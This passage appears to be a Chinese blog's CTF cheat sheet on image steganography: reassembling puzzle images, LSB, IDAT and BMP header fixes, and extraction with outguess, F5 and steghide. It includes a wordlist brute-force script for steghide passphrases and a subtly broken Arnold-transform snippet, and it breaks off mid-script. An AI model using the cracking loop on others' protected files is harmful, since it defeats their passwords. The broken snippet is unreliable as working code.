<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在kali中处理</span></span><br><span class="line">拉入kali里处理，如果是碎的图片，</span><br><span class="line">先使用 montage *.PNG -tile 12x12 -geometry +0+0 out.png合成一张图片</span><br><span class="line">*.png表示匹配所有图片</span><br><span class="line">-tile表示图片的张数</span><br><span class="line">-geometry +0+0表示每张图片的间距为0</span><br><span class="line">合成后要先查看图片的宽高（宽高要相等，不相等要用PS调整）</span><br></pre></td></tr></table></figure>
<p><strong>然后把上面合成好的图片使用 Puzzle-Merak 工具进行智能拼图</strong></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/puzzles1.png"
                        alt="puzzles1"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/puzzles2.png"
                        alt="puzzles2"
                 ></p>
<p><strong>输入 generation、population、size 并用分号分开即可开始自动拼图</strong></p>
<p><strong>也可以使用gaps智能拼图(在kali和wsl里使用都可以)</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gaps --image=out.png --generation=30 --population=144 --size=30 --save </span><br><span class="line"></span><br><span class="line">--image 指向拼图的路径</span><br><span class="line">--size 拼图块的像素尺寸</span><br><span class="line">--generations 遗传算法的代的数量</span><br><span class="line">--population 个体数量</span><br><span class="line">--verbose 每一代训练结束后展示最佳结果</span><br><span class="line">--save 将拼图还原为图像</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gaps --image=flag.jpg --generations=50 --population=180 --size=125 --verbose</span><br><span class="line"></span><br><span class="line">-generations 要迭代多少次</span><br><span class="line">-population 有多少个小拼图</span><br><span class="line">--size 每张小图，也就是拼图小块的大小</span><br><span class="line">--verbose 实时显示</span><br></pre></td></tr></table></figure>
<h4 id="近邻法缩放图片">近邻法缩放图片</h4>
<p>在PS中打开图片，然后在更改图像大小中，将宽高调成指定像素并将重新采样选项选为邻近（硬边缘）</p>
<h4 id="pixeljihad">pixeljihad</h4>
<p>pixeljihad隐写 有密码</p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://sekao.net/pixeljihad/" >https://sekao.net/pixeljihad/<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="隐写文本藏在原图片和隐写文件中间">隐写文本藏在原图片和隐写文件中间</h4>
<p>在010 Editor中搜索IEND，查看后面有没有额外内容</p>
<h4 id="提取图片中等距的像素点得到隐写的图片">提取图片中等距的像素点得到隐写的图片</h4>
<p>在PowerShell中运行Get_Pixels.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Get_Pixels.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-resize&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    <span class="comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span></span><br><span class="line">                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)</span><br><span class="line">                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)</span><br><span class="line">                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()</span><br><span class="line">                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">py main.py -f arcaea.png -p 0x0+3828x2148 -n 12x12</span><br><span class="line">py main.py -f 要解密的图片 -p 第一个像素点的XY坐标+最后一个像素点的XY坐标 -n 两个等距像素点的XY距离的差值</span><br><span class="line">如果是等距离提取整张图片中所有像素点，要注意右下角那个点的位置XY都要减去一倍的距离</span><br><span class="line">Tips:在PS中按F8就可以看到每个像素点的具体坐标了</span><br></pre></td></tr></table></figure>
<h4 id="silenteye隐写">silenteye隐写</h4>
<p>特征：放大图像后会有行列不对齐的小灰块</p>
<p>直接用 silenteye 打开输入密钥decode即可，默认密钥是 silenteye</p>
<h4 id="图片报错改宽高后图片无变化">图片报错改宽高后图片无变化</h4>
<p>再 foremost 一下</p>
<h4 id="DeEgger-Embedder隐写">DeEgger Embedder隐写</h4>
<p>使用 DeEgger Embedder 工具 extract files</p>
<h4 id="EXIF隐写">EXIF隐写</h4>
<p>直接在 WSL 中输入以下命令查看即可，也可以直接使用 破空 flag 查找工具 进行查找</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool 1.jpg</span><br></pre></td></tr></table></figure>
<h4 id="npiet">npiet</h4>
<p><a class="link"   target="_blank" rel="noopener" href="https://gabriellesc.github.io/piet/" >Gabrielle Singh Cadieux - Piet IDE<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npiet.exe <span class="literal">-tpic</span> image.png</span><br></pre></td></tr></table></figure>
<h4 id="猫脸变换">猫脸变换</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> </span><br><span class="line">it = cv2.imread(<span class="string">&#x27;input.png&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image, shuffle_times, a, b</span>):</span><br><span class="line">    </span><br><span class="line"><span class="comment">#修改参数a和b</span></span><br><span class="line">	a=<span class="number">13</span> </span><br><span class="line">    b=<span class="number">14</span></span><br><span class="line">    <span class="comment"># 1:创建新图像</span></span><br><span class="line">    decode_image = np.zeros(shape=image.shape)</span><br><span class="line">    <span class="comment"># 2：计算N</span></span><br><span class="line">    h, w = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = h  <span class="comment"># 或N=w</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 3：遍历像素坐标变换</span></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        <span class="keyword">for</span> ori_x <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            <span class="keyword">for</span> ori_y <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">                <span class="comment"># 按照公式坐标变换</span></span><br><span class="line">                new_x = ((a * b + <span class="number">1</span>) * ori_x + (-b) * ori_y) % N</span><br><span class="line">                new_y = ((-a) * ori_x + ori_y) % N</span><br><span class="line">                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;flag.png&#x27;</span>, decode_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">arnold_decode(it, <span class="number">1</span>, <span class="number">121</span>, <span class="number">144</span>)</span><br></pre></td></tr></table></figure>
<h3 id="PNG图片隐写">PNG图片隐写</h3>
<h4 id="CRC错误">CRC错误</h4>
<p>修改宽高，17~20是宽，21~24是高</p>
<p>可用Puzzle Solver一把梭修改</p>
<h4 id="LSB隐写">LSB隐写</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wsl</span></span><br><span class="line">zsteg -a (文件名)  <span class="comment">#查看各个通道的lsb</span></span><br><span class="line">-b的位数是从1开始的 zsteg zlib.bmp -b 1 -o xy -v</span><br><span class="line">提取文件并导出 zsteg -e b1,r,lsb,xy 3.png &gt; 123.jpg</span><br></pre></td></tr></table></figure>
<p>信息藏在图片中有时候会看不出来，所以还是要用stegsolve.jar过一遍</p>
<h4 id="cloacked-pixel">cloacked-pixel</h4>
<p>lsb隐写的可能是加密后的数据，i春秋最喜欢的<strong>cloacked-pixel</strong></p>
<p>拉到kali/WSL里用cloacked-pixel命令解密出数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 cloacked-pixel-master/lsb.py extract 0.png out.data f78dcd383f1b574b</span><br></pre></td></tr></table></figure>
<p>0.png是隐写后的图片；out.data是隐写内容保存的位置；f78dcd383f1b574b是密钥</p>
<h4 id="IDAT块隐写">IDAT块隐写</h4>
<p>拉到kali里用pngcheck -v 0.png检查IDAT</p>
<p><strong>解压zlib获得原始数据</strong></p>
<p>然后用010提取数据扔进zlib脚本解压获得原始数据</p>
<p>将异常的IDAT数据块斩头去尾之后使用脚本解压，在python2代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">IDAT = <span class="string">&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line"><span class="built_in">print</span> (result.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(result.decode(<span class="string">&#x27;hex&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<p><strong>加上文件头爆破宽高得到新的图片</strong></p>
<p>一般出问题的 IDAT Chunk 大小都是比正常的小的，很可能在图片末尾</p>
<p>如果不确定是哪一个有问题，可以尝试都提取出来，一个一个分析</p>
<p>可以使用 tweakpng 辅助分析，但是一般用010的模板提取分析就够了</p>
<h4 id="apngdis-gui">apngdis_gui</h4>
<p>一张png图片还可能是apng，直接用apngdis_gui跑一下，可以分出两张相似的png</p>
<h4 id="CVE-2023-28303-截图工具漏洞">CVE-2023-28303 截图工具漏洞</h4>
<p>可以使用Github上大佬写好的工具一把梭，前提是需要知道原图的分辨率</p>
<h4 id="stegpy隐写">stegpy隐写</h4>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/izcoser/stegpy" > stegpy 开源地址<i class="fas fa-external-link-alt"></i></a> 下载好后直接用WSL输入以下命令并输入密码解密即可</p>
<p>也可以直接用 pip 安装： pip3 install stegpy</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegpy 1.png -p</span><br></pre></td></tr></table></figure>
<h3 id="JPG图片隐写">JPG图片隐写</h3>
<h4 id="outguess隐写">outguess隐写</h4>
<p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/crorvick/outguess" >https://github.com/crorvick/outguess<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#WSL安装</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/crorvick/outguess</span><br><span class="line"><span class="built_in">cd</span> outguess</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<p>加密</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</span><br><span class="line"><span class="comment">#key：my secret key</span></span><br><span class="line"><span class="comment">#要隐藏的内容：hidden.txt</span></span><br><span class="line"><span class="comment">#原图：demo.jpg</span></span><br><span class="line"><span class="comment">#隐写后：out.jpg，隐写后会覆盖原图</span></span><br></pre></td></tr></table></figure>
<p>解密</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">outguess -k “my secret key” -r out.jpg hidden.txt</span><br><span class="line"><span class="comment">#-k 后面跟的是解密的密钥</span></span><br><span class="line"><span class="comment">#hidden.txt是解密后数据保存的位置</span></span><br></pre></td></tr></table></figure>
<h4 id="F5-steganography-master（F5隐写）">F5-steganography-master（F5隐写）</h4>
<p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/matthewgao/F5-steganography" >https://github.com/matthewgao/F5-steganography<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#有密码的情况</span></span><br><span class="line">java Extract beautiful.jpg -p passwd</span><br><span class="line"><span class="comment">#无密码的情况</span></span><br><span class="line">java Extract beautiful.jpg</span><br><span class="line"><span class="comment">#解密出来的数据会放到F5文件夹下的output.txt中</span></span><br></pre></td></tr></table></figure>
<h4 id="JPHS隐写">JPHS隐写</h4>
<p>有可能会有密码</p>
<p>导出步骤 Select File --&gt; seek --&gt; demo.txt --&gt; Save the file</p>
<h4 id="steghide隐写">steghide隐写</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#密码已知</span></span><br><span class="line">steghide extract -sf filename -p passwd</span><br></pre></td></tr></table></figure>
<p>在WSL或者kali里用Stegseek跑（字典在wordlist里）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#密码未知</span></span><br><span class="line">可以用下面这个脚本爆破</span><br><span class="line"><span class="comment">#bruteStegHide.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> `<span class="built_in">cat</span> <span class="variable">$2</span>`;<span class="keyword">do</span></span><br><span class="line">    steghide extract -sf <span class="variable">$1</span> -p <span class="variable">$line</span> &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [[ $? -eq 0 ]];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;password is: &#x27;</span><span class="variable">$line</span></span><br><span class="line">        <span class="built_in">exit</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#或者在WSL或者kali里用Stegseek跑（字典在wordlist里）</span></span><br><span class="line">stegseek filename rockyou.txt</span><br></pre></td></tr></table></figure>
<h3 id="BMP图片隐写">BMP图片隐写</h3>
<p><strong>宽高爆破</strong></p>
<p>删除文件头，并保存为文件名.data，然后用GIMP打开修改宽高（比较方便）</p>
<p>或者直接用bmp爆破脚本跑 python <a class="link"   target="_blank" rel="noopener" href="http://script.py" >script.py<i class="fas fa-external-link-alt"></i></a> -f filename.bmp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用这个脚本要注意对图片一个个使用</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;输入同级目录下图片的名称&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">SAVE_DIR = os.getcwd()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">data, width=<span class="literal">None</span>, height=<span class="literal">None</span>, sqrt_num=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(SAVE_DIR, <span class="string">&quot;fix_width.bmp&quot;</span>), <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data[:<span class="number">0x12</span>] + width.to_bytes(<span class="number">4</span>,</span><br><span class="line">                byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>) + data[<span class="number">0x16</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(SAVE_DIR, <span class="string">&quot;fix_height.bmp&quot;</span>), <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data[:<span class="number">0x16</span>] + height.to_bytes(<span class="number">4</span>,</span><br><span class="line">                byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>) + data[<span class="number">0x1a</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(SAVE_DIR, <span class="string">&quot;fix_sqrt.bmp&quot;</span>), <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data[:<span class="number">0x12</span>] + sqrt_num.to_bytes(<span class="number">4</span>,</span><br><span class="line">                byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>) * <span class="number">2</span> + data[<span class="number">0x1a</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pixels_size</span>(<span class="params">data</span>):</span><br><span class="line">    bfSize = <span class="built_in">int</span>.from_bytes(data[<span class="number">0x2</span>:<span class="number">0x2</span>+<span class="number">4</span>], byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    bfOffBits = <span class="built_in">int</span>.from_bytes(</span><br><span class="line">        data[<span class="number">0xa</span>:<span class="number">0xa</span>+<span class="number">4</span>], byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    biBitCount = <span class="built_in">int</span>.from_bytes(</span><br><span class="line">        data[<span class="number">0x1c</span>:<span class="number">0x1c</span>+<span class="number">2</span>], byteorder=<span class="string">&quot;little&quot;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    channel = biBitCount // <span class="number">8</span></span><br><span class="line">    <span class="comment"># 由于宽高都会被修改，所以我计算出来的Padding_size也不是正确的，没有意义</span></span><br><span class="line">    <span class="comment"># padding_size = (4 - col * channel % 4) * row if col * channel % 4 != 0 else 0</span></span><br><span class="line">    <span class="comment"># pixels_size = (bfSize - bfOffBits - padding_size) // channel</span></span><br><span class="line">    <span class="keyword">return</span> (bfSize - bfOffBits) // channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    file_path = os.path.abspath(args.f)</span><br><span class="line">    <span class="keyword">if</span> os.path.splitext(args.f)[-<span class="number">1</span>] != <span class="string">&quot;.bmp&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;您的文件后缀名不为BMP!&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    col = <span class="built_in">abs</span>(<span class="built_in">int</span>.from_bytes(data[<span class="number">0x12</span>:<span 